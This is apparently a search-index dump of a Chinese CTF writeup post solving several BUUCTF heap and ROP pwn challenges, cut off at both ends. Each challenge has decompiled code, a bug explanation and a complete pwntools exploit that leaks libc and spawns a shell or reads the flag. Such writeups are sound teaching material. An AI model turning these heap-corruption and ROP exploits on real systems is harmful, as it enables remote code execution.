up(0x400,'a'*0x10,666,0xddaa) see() heapbase = u64(sh.recvuntil('\\x56')[-6:].ljust(8,'\\x00')) leak('heap base',heapbase) vtable=heapbase+0x400+0x20+0x100-0x10 payload = '\\x00'*0x408+p64(0x21)+'\\x00'*0x10 payload+='/bin/sh\\x00'+p64(0x61) payload+=p64(main_arena)+p64(IO_list_all-0x10) payload+=p64(0x2)+p64(0x3)+p64(0)*21 payload+=p64(vtable)+p64(0)*3+p64(system) up(0x1000,payload,666,0xddaa) #get shell #gdb.attach(sh) sh.recvuntil('choice : ') sh.sendline('1') sh.interactive() offset 0x0 _flags 0x8 _IO_read_ptr 0x10 _IO_read_end 0x18 _IO_read_base 0x20 _IO_write_base 0x28 _IO_write_ptr 0x30 _IO_write_end 0x38 _IO_buf_base 0x40 _IO_buf_end 0x48 _IO_save_base 0x50 _IO_backup_base 0x58 _IO_save_end 0x60 _markers 0x68 _chain 0x70 _fileno 0x74 _flags2 0x78 _old_offset 0x80 _cur_column 0x82 _vtable_offset 0x83 _shortbuf 0x88 _lock 0x90 _offset 0x98 _codecvt 0xa0 _wide_data 0xa8 _freeres_list 0xb0 _freeres_buf 0xb8 __pad5 0xc0 _mode 0xc4 _unused2 0xd8 vtable void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue }; ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp"},{"categories":["Writeups"],"content":"BUU-npuctf2020-easyheap","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-npuctf2020-easyheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-1"},{"categories":["Writeups"],"content":"IDAcreate unsigned __int64 create() { __int64 v0; // rbx int i; // [rsp+4h] [rbp-2Ch] size_t size; // [rsp+8h] [rbp-28h] char buf[8]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-18h] v5 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( !*((_QWORD *)\u0026heaparray + i) ) { *((_QWORD *)\u0026heaparray + i) = malloc(0x10uLL); if ( !*((_QWORD *)\u0026heaparray + i) ) { puts(\"Allocate Error\"); exit(1); } printf(\"Size of Heap(0x10 or 0x20 only) : \"); read(0, buf, 8uLL); size = atoi(buf); if ( size != 24 \u0026\u0026 size != 56 ) exit(-1); v0 = *((_QWORD *)\u0026heaparray + i); *(_QWORD *)(v0 + 8) = malloc(size); if ( !*(_QWORD *)(*((_QWORD *)\u0026heaparray + i) + 8LL) ) { puts(\"Allocate Error\"); exit(2); } **((_QWORD **)\u0026heaparray + i) = size; printf(\"Content:\"); read_input(*(_QWORD *)(*((_QWORD *)\u0026heaparray + i) + 8LL), size); puts(\"Done!\"); return __readfsqword(0x28u) ^ v5; } } return __readfsqword(0x28u) ^ v5; } edit unsigned __int64 edit() { int v1; // [rsp+0h] [rbp-10h] char buf[4]; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *((_QWORD *)\u0026heaparray + v1) ) { printf(\"Content: \"); read_input(*(_QWORD *)(*((_QWORD *)\u0026heaparray + v1) + 8LL), **((_QWORD **)\u0026heaparray + v1) + 1LL); puts(\"Done!\"); } else { puts(\"How Dare you!\"); } return __readfsqword(0x28u) ^ v3; } show unsigned __int64 show() { int v1; // [rsp+0h] [rbp-10h] char buf[4]; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *((_QWORD *)\u0026heaparray + v1) ) { printf( \"Size : %ld\\nContent : %s\\n\", **((_QWORD **)\u0026heaparray + v1), *(const char **)(*((_QWORD *)\u0026heaparray + v1) + 8LL)); puts(\"Done!\"); } else { puts(\"How Dare you!\"); } return __readfsqword(0x28u) ^ v3; } dele unsigned __int64 delete() { int v1; // [rsp+0h] [rbp-10h] char buf[4]; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *((_QWORD *)\u0026heaparray + v1) ) { free(*(void **)(*((_QWORD *)\u0026heaparray + v1) + 8LL)); free(*((void **)\u0026heaparray + v1)); *((_QWORD *)\u0026heaparray + v1) = 0LL; puts(\"Done !\"); } else { puts(\"How Dare you!\"); } return __readfsqword(0x28u) ^ v3; } 利用edit中的off-by-one造成chunk overlapping修改指针，从而改写got表。 ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" local=0 binary='./npuctf_2020_easyheap' #gdb.attach(sh) if local: context.log_level=\"DEBUG\" sh=process(binary) else: sh=remote('node3.buuoj.cn',29293) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.27.so',checksec=False) one=[0x4f2c5,0x4f322,0x10a38c] puts_got = elf.got['puts'] free_got = elf.got['free'] def add(size, content): sh.recvuntil(' :') sh.sendline('1') sh.sendlineafter(') : ', str(size)) sh.sendafter('Content:', str(content)) def edit(idx, content): sh.recvuntil(' :') sh.sendline('2') sh.sendlineafter('ndex :', str(idx)) sh.sendafter('Content:', str(content)) def show(idx): sh.recvuntil(' :') sh.sendline('3') sh.sendlineafter('ndex :', str(idx)) def free(idx): sh.recvuntil(' :') sh.sendline('4') sh.sendlineafter('ndex :', str(idx)) add(0x18,'1'*8) #0 add(0x18,'2'*8) #1 add(0x18,'/bin/sh\\x00') #2 edit(0, '\\x00'*0x18+'\\x41') free(1) add(0x38,'4'*8*3+p64(0x21)+p64(0x38)+p64(free_got)) #1 #gdb.attach(sh) show(1) free_addr=u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) leak('free',free_addr) libcbase = free_addr-libc.sym['free'] free_hook = libcbase+libc.sym['__free_hook'] system = libcbase+libc.sym['system'] leak('libc base',libcbase) one_gadget = libcbase+one[2] edit(1,p64(system)) free(2) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-1"},{"categories":["Writeups"],"content":"BUU-hitcon2018_children_tcache","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-hitcon2018_children_tcache"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-2"},{"categories":["Writeups"],"content":"IDAadd unsigned __int64 add() { int i; // [rsp+Ch] [rbp-2034h] char *dest; // [rsp+10h] [rbp-2030h] unsigned __int64 size; // [rsp+18h] [rbp-2028h] char s[8216]; // [rsp+20h] [rbp-2020h] BYREF unsigned __int64 v5; // [rsp+2038h] [rbp-8h] v5 = __readfsqword(0x28u); memset(s, 0, 0x2010uLL); for ( i = 0; ; ++i ) { if ( i \u003e 9 ) { puts(\":(\"); return __readfsqword(0x28u) ^ v5; } if ( !heap_array[i] ) break; } printf(\"Size:\"); size = sub_B67(); if ( size \u003e 0x2000 ) exit(-2); dest = (char *)malloc(size); if ( !dest ) exit(-1); printf(\"Data:\"); sub_BC8(s, (unsigned int)size); strcpy(dest, s); // off-by-null heap_array[i] = dest; size_array[i] = size; return __readfsqword(0x28u) ^ v5; } show int show() { __int64 v0; // rax unsigned __int64 v2; // [rsp+8h] [rbp-8h] printf(\"Index:\"); v2 = sub_B67(); if ( v2 \u003e 9 ) exit(-3); v0 = heap_array[v2]; if ( v0 ) LODWORD(v0) = puts((const char *)heap_array[v2]); return v0; } dele int dele() { unsigned __int64 v1; // [rsp+8h] [rbp-8h] printf(\"Index:\"); v1 = sub_B67(); if ( v1 \u003e 9 ) exit(-3); if ( heap_array[v1] ) { memset((void *)heap_array[v1], 218, size_array[v1]); free((void *)heap_array[v1]); heap_array[v1] = 0LL; size_array[v1] = 0LL; } return puts(\":)\"); } 漏洞是off-by-null，而远程的libc还没有tcache的double free的检查。通过off-by-one，我们能做到清空下一个chunk的prev_inuse位，这点可以导致overlapping。 首先，申请三个chunk。chunk_0和chunk_2要是large bin，这样就不会进入tcache中，我们通过chunk_1，清除chunk_2的prev_inuse位，并将prev_size域设为chunk_0+chunk_1的大小，让chunk_2认为前面有一块巨大的更大的chunk。在做这一步之前，要首先将chunk_0 free掉，不然在后续的free中会出现size与prev_size的不匹配，导致程序退出。 之后free掉chunk_2，此时这三个chunk被合并加入了unsorted bin中，然后，申请和最开始chunk_0同样大小的chunk，unsorted bin中的chunk被分割，原本的chunk_1+chunk_2被加入unsorted bin。注意，这时chunk_1还在被我们使用中，所以可以通过show来leak libc。 接着，想办法控制程序执行流。再次，将chunk_1申请回来，这样我们就有两个chunk，指向chunk_1，使用tcache_psisoning获得__malloc_hook附近的chunk，填入one_gadget，从而get shell。 ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" local=0 binary='./HITCON_2018_children_tcache' #gdb.attach(sh) if local: context.log_level=\"DEBUG\" sh=process(binary) else: sh=remote('node3.buuoj.cn',25968) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.27.so',checksec=False) heap_array=0x202060 free_got = elf.got['free'] def add(size, content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('Size:', str(size)) sh.sendlineafter('Data:', str(content)) def show(idx): sh.recvuntil('choice: ') sh.sendline('2') sh.sendlineafter('Index:', str(idx)) def free(idx): sh.recvuntil('choice: ') sh.sendline('3') sh.sendlineafter('Index:', str(idx)) add(0x4f8,'a') #0 0x500 add(0x78,'b') #1 0x80 add(0x4f8,'c') #2 0x500 add(0x18,'/bin/sh\\x00') #3 free(1) free(0) #clear chunk_3's prev_inuse bit for i in range(0,8): add((0x78-i),'a'*(0x78-i)) #0 0x80 free(0) add(0x78,'b'*0x70+p64(0x580)) #0 0x80 free(2) add(0x4f8,'c'*0x4f7) #1 #gdb.attach(sh) show(0) main_arena = u64(sh.recvuntil('\\x7f').ljust(8,'\\x00'))-96 malloc_hook = main_arena-0x10 libc=LibcSearcher('__malloc_hook',malloc_hook) libcbase=malloc_hook-libc.dump('__malloc_hook') one_gadget = libcbase + 0x4f322 leak('libcbase',libcbase) add(0x78,'a') #2 free(0) free(2) add(0x78,p64(malloc_hook)) #0 add(0x78,p64(malloc_hook)) #2 add(0x78,p64(one_gadget)) #4 sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('Size:', str(12)) sh.interactive() 注意strcpy本身会被’\\x00’截断，所以通过循环off-by-null的方式修改prev_size。 ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-2"},{"categories":["Writeups"],"content":"BUU-vn2020-easyTHeap","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-vn2020-easytheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-3"},{"categories":["Writeups"],"content":"IDAmain void __fastcall main(__int64 a1, char **a2, char **a3) { sub_A39(a1, a2, a3); puts(\"Welcome to V\u0026N challange!\"); puts(\"This's a tcache heap for you.\"); while ( 1 ) { sub_DCF(); switch ( (unsigned int)sub_9EA() ) { case 1u: if ( !add_count )//7 exit(0); add(); --add_count; break; case 2u: edit(); break; case 3u: show(); break; case 4u: if ( !free_count )//3 { puts(\"NoNoNo!\"); exit(0); } free_(); --free_count; break; case 5u: exit(0); default: puts(\"Please input current choice.\"); break; } } } add int add() { int result; // eax int v1; // [rsp+8h] [rbp-8h] int v2; // [rsp+Ch] [rbp-4h] v1 = sub_AB2(); if ( v1 == -1 ) return puts(\"Full\"); printf(\"size?\"); result = sub_9EA(); v2 = result; if ( result \u003e 0 \u0026\u0026 result \u003c= 256 ) { qword_202080[v1] = malloc(result); if ( !qword_202080[v1] ) { puts(\"Something Wrong!\"); exit(-1); } dword_202060[v1] = v2; result = puts(\"Done!\"); } return result; } show int sub_CA4() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = sub_9EA(); if ( v1 \u003c 0 || v1 \u003e 6 || !*((_QWORD *)\u0026qword_202080 + v1) ) exit(0); puts(*((const char **)\u0026qword_202080 + v1)); return puts(\"Done!\"); } edit int edit() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = sub_9EA(); if ( v1 \u003c 0 || v1 \u003e 6 || !qword_202080[v1] ) exit(0); printf(\"content:\"); read(0, (void *)qword_202080[v1], (unsigned int)dword_202060[v1]); return puts(\"Done!\"); } dele int free_() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = sub_9EA(); if ( v1 \u003c 0 || v1 \u003e 6 || !qword_202080[v1] ) exit(0); free((void *)qword_202080[v1]); dword_202060[v1] = 0; return puts(\"Done!\"); } 严格限制了add次数为7次，free次数为3次。但是没有销毁指针，只是修改了size为0。 在远程的环境中，为glibc-2.27，tcache没有对double free的检测，所以我们可以通过double free泄露堆的基址。tcache struct就在堆的最开始，通过计算偏移，修改tcache中chunk的fd指针，将这块内存申请出来，然后修改其count的数量，从而防止之后free的chunk进入tcache。再将这块内存进行free，它会进入unsorted bin中从而leak libc。 这时再进行申请，系统会将tcache struct进行分割，返回给我们，我们再修改其next指针，指向malloc_hook附近的fake chunk从而覆写get shell。 ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-3"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./vn_pwn_easyTHeap' if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',26965) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.27.so',checksec=False) #gdb.attach(sh) def add(size): sh.sendlineafter(': ','1') sh.sendlineafter('?',str(size)) def edit(idx,content): sh.sendlineafter(': ','2') sh.sendlineafter('?',str(idx)) sh.sendafter('content:',str(content)) def show(idx): sh.sendlineafter(': ','3') sh.sendlineafter('?',str(idx)) def free(idx): sh.sendlineafter(': ','4') sh.sendlineafter('?',str(idx)) one = [0x4f2c5,0x4f322,0x10a38c] add(0x50) #0 free(0) free(0) #gdb.attach(sh) show(0) heap_base = u64(sh.recvuntil('\\n', drop = True).ljust(8, '\\x00'))-0x250 leak('heap base',heap_base) add(0x50) #1 edit(1,p64(heap_base)) add(0x50) #2 add(0x50) #3 edit(3,'A'*0x28) free(3) show(3) main_arena = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) libcbase = main_arena-libc.sym['__malloc_hook']-0x70 fake_chunk = libcbase+libc.sym['__malloc_hook']-0x13 realloc =libcbase+libc.sym['__libc_realloc'] one_gadget = libcbase+one[1] leak('libc base',libcbase) add(0x50) #4 from tcache_struct edit(4,'\\x00'*0x48+p64(fake_chunk)) add(0x20) #5 edit(5,'\\x00'*(0x13-8)+p64(one_gadget)+p64(realloc+8)) add(0x10) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-3"},{"categories":["Writeups"],"content":"BUU-vn2020-simpleheap","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-vn2020-simpleheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-4"},{"categories":["Writeups"],"content":"IDAadd int add() { int result; // eax int v1; // [rsp+8h] [rbp-8h] int v2; // [rsp+Ch] [rbp-4h] v1 = sub_AB2(); if ( v1 == -1 ) return puts(\"Full\"); printf(\"size?\"); result = choice(); v2 = result; if ( result \u003e 0 \u0026\u0026 result \u003c= 111 ) { *((_QWORD *)\u0026unk_2020A0 + v1) = malloc(result); if ( !*((_QWORD *)\u0026unk_2020A0 + v1) ) { puts(\"Something Wrong!\"); exit(-1); } dword_202060[v1] = v2; printf(\"content:\"); read(0, *((void **)\u0026unk_2020A0 + v1), dword_202060[v1]); result = puts(\"Done!\"); } return result; } edit int edit() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = choice(); if ( v1 \u003c 0 || v1 \u003e 9 || !qword_2020A0[v1] ) exit(0); printf(\"content:\"); sub_C39(qword_2020A0[v1], dword_202060[v1]); return puts(\"Done!\"); } show int show() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = choice(); if ( v1 \u003c 0 || v1 \u003e 9 || !qword_2020A0[v1] ) exit(0); puts((const char *)qword_2020A0[v1]); return puts(\"Done!\"); } dele int dele() { int v1; // [rsp+Ch] [rbp-4h] printf(\"idx?\"); v1 = choice(); if ( v1 \u003c 0 || v1 \u003e 9 || !qword_2020A0[v1] ) exit(0); free((void *)qword_2020A0[v1]); qword_2020A0[v1] = 0LL; dword_202060[v1] = 0; return puts(\"Done!\"); } 输入函数 unsigned __int64 __fastcall sub_C39(__int64 a1, int a2) { unsigned __int64 result; // rax unsigned int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = i; if ( (int)i \u003e a2 ) break; if ( !read(0, (void *)((int)i + a1), 1uLL) ) exit(0); if ( *(_BYTE *)((int)i + a1) == 10 ) { result = (int)i + a1; *(_BYTE *)result = 0; return result; } } return result; } 唯一的漏洞点就在这个输入函数中，它将跳出循环的条件放在了内部，导致了off-by-one，从而可以通过ovlapping chunkleak libc，之后再通过修改fd利用house_of_spirit，覆写__malloc_hook配合__realloc_hook实现get shell。 ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-4"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./vn_pwn_simpleHeap' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',29656) elf = ELF(binary,checksec=False) libc = ELF('./libc-2.23.so') def add(size,content): sh.sendlineafter(': ','1') sh.sendlineafter('?',str(size)) sh.sendafter(':',str(content)) def edit(idx,content): sh.sendlineafter(': ','2') sh.sendlineafter('?',str(idx)) sh.sendafter(':',str(content)) def show(idx): sh.sendlineafter(': ','3') sh.sendlineafter('?',str(idx)) def dele(idx): sh.sendlineafter(': ','4') sh.sendlineafter('?',str(idx)) one = [0x45216,0x4526a,0xf02a4,0xf1147] local = [0x45226,0x4527a,0xf0364,0xf1207] add(0x18,'a'*0x18) #0 add(0x68,'b'*0x18) #1 0x70 add(0x68,'c'*0x18) #2 0x70 add(0x18,'d'*0x18) #3 0x20 edit(0,'\\x00'*0x18+'\\xe1') dele(1) add(0x68,'a'*8) #1 show(2) main_arena = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-88 libc_base=main_arena - 0x3C4B20 malloc_hook = libc_base + 0x3c4b10 fake_chunk = malloc_hook -0x23 realloc = libc_base+0x846C0 one_gadget = libc_base + one[1] leak('main_arena', main_arena) leak('malloc_hook',malloc_hook) leak('fake_chunk', fake_chunk) leak('libc_base', libc_base) leak('one gadget',one_gadget) add(0x68,'\\n') #4--\u003e2 dele(2) edit(4,p64(fake_chunk)+'\\n') add(0x68,'\\n') add(0x68,'\\x00'*(0x13-8)+p64(one_gadget)+p64(realloc+0xd)) sh.sendlineafter(': ','1') sh.sendlineafter('?','10') sh.interactive() 较为常规的一道题目 ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-4"},{"categories":["Writeups"],"content":"BUU-vn2020-warmup","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-vn2020-warmup"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-5"},{"categories":["Writeups"],"content":"IDA __int64 __fastcall main(__int64 a1, char **a2, char **a3) { sub_80A(a1, a2, a3); puts(\"This is a easy challange for you.\"); printf(\"Here is my gift: 0x%llx\\n\", \u0026puts); sub_84D();//沙箱，禁用write和exceve sub_9D3(); return 0LL; } int sub_9D3() { char buf[384]; // [rsp+0h] [rbp-180h] BYREF printf(\"Input something: \"); read(0, buf, 0x180uLL); sub_9A1(); return puts(\"Done!\"); } ssize_t sub_9A1() { char buf[112]; // [rsp+0h] [rbp-70h] BYREF printf(\"What's your name?\"); return read(0, buf, 0x80uLL); } 给了我们puts的地址，我们可以以此来确定libc基址。但是由于不能get shell，所以要构造orw的ROP。开启了PIE保护，选择在libc中找gadget，在name处可以溢出，覆盖返回地址和rbp。 注意到，sub_9A1的栈应该在sub_9D3的下方，且两者是调用关系，sub_9A1的buf的栈应该与sub_9D3相邻，所以我们只要让栈再ret到sub_9D3的buf里就可以，通过覆盖返回地址为pop_rdi_ret，最后ret到ROP处。 open函数还需要一个flag字符串，由于程序的位置是随机的，我们将这个字符串写在栈上，例如free_hook ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-5"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./vn_pwn_warmup' #gdb.attach(sh) # if local: # sh=process(binary) # else: # sh=remote('node3.buuoj.cn',27261) elf = ELF(binary,checksec=False) while True: sh=remote('node3.buuoj.cn',28653) sh.recvuntil('gift: ') puts_addr=int(sh.recvuntil('\\n'),16) libc=ELF(\"libc6_2.23-0ubuntu10_amd64.so\",checksec=False) libcbase=puts_addr-libc.symbols['puts'] leak('libc base',libcbase) pop_rdi=libcbase+0x21102 pop_rsi=libcbase+0x202e8 pop_rdx=libcbase+0x1b92 open_addr=libcbase+libc.sym['open'] free_hook=libcbase+libc.sym['__free_hook'] read_addr=libcbase+libc.sym['read'] puts_addr=libcbase+libc.sym['puts'] payload=p64(0)+p64(pop_rsi)+p64(free_hook)+p64(pop_rdx)+p64(4)+p64(read_addr) payload+=p64(pop_rdi)+p64(free_hook)+p64(pop_rsi)+p64(4)+p64(open_addr) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(free_hook)+p64(pop_rdx)+p64(0x30)+p64(read_addr) payload+=p64(pop_rdi)+p64(free_hook)+p64(puts_addr) try: sh.sendafter(\"Input something: \",payload) sh.sendafter(\"What's your name?\",'a'* 0x78+p64(pop_rdi)) sh.send(\"./flag\") flag = sh.recv() if 'flag' in flag: print(flag) except: sh.close() continue ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-5"},{"categories":["Writeups"],"content":"BUU-hitcontraining-stkof","date":"2021-04-18","objectID":"/challenges-100-week-7/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#buu-hitcontraining-stkof"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-7/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#checksec-6"},{"categories":["Writeups"],"content":"IDAadd __int64 sub_400936() { __int64 size; // [rsp+0h] [rbp-80h] char *v2; // [rsp+8h] [rbp-78h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(s, 16, stdin); size = atoll(s); v2 = (char *)malloc(size); if ( !v2 ) return 0xFFFFFFFFLL; (\u0026::s)[++chunk_count] = v2; printf(\"%d\\n\", (unsigned int)chunk_count); return 0LL; } edit __int64 sub_4009E8() { __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s[104]; // [rsp+20h] [rbp-70h] BYREF unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(s, 16, stdin); index = atol(s); if ( index \u003e 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026::s)[index] ) return 0xFFFFFFFFLL; fgets(s, 16, stdin); size = atoll(s); ptr = (\u0026::s)[index]; for ( i = fread(ptr, 1uLL, size, stdin); i \u003e 0; i = fread(ptr, 1uLL, size, stdin) ) { ptr += i; size -= i; } if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result; } free __int64 sub_400B07() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(s, 16, stdin); v1 = atol(s); if ( v1 \u003e 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026::s)[v1] ) return 0xFFFFFFFFLL; free((\u0026::s)[v1]); (\u0026::s)[v1] = 0LL; return 0LL; } show __int64 sub_400BA9() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(s, 16, stdin); v1 = atol(s); if ( v1 \u003e 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026::s)[v1] ) return 0xFFFFFFFFLL; if ( strlen((\u0026::s)[v1]) \u003c= 3 ) puts(\"//TODO\"); else puts(\"...\"); return 0LL; } free时销毁了指针，没有UAF利用。但是可以申请任意大小的内存，在edit中有溢出。 同时，注意到堆指针都保存在.bss段上的s中。可以使用unlink，对指针进行覆写。 注意在show中，使用了strlen但是并没有真正输出内容。通过覆写strlen的got表为puts的plt表。再修改另一个堆块的指针为某got表，可以leak libc地址。 ","date":"2021-04-18","objectID":"/challenges-100-week-7/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#ida-6"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./stkof' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',28140) elf = 